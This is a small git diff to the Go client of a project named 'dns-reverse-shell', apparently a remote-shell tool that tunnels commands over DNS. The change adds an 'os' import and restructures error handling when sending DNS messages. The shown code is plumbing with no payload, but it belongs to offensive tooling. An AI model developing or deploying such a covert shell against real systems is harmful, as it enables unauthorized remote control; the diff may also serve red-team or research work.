@@ -4,6 +4,7 @@ import (
 	"dns-reverse-shell/main/encoder"
 	"fmt"
 	"github.com/miekg/dns"
+	"os"
 	"os/exec"
 	"time"
 )
@@ -53,10 +54,9 @@ func (d DNSClient) sendMessage(commandType messageType, message string) {
 	in, _, err := d.client.Exchange(m, d.address)
 	if err != nil {
 		fmt.Println(err)
-		d.sendMessage(ERROR, err.Error())
-		return
+	} else {
+		d.handleAnswer(in)
 	}
-	d.handleAnswer(in)
 }
 
 func (d DNSClient) createMessage(commandType messageType, message string) *dns.Msg {
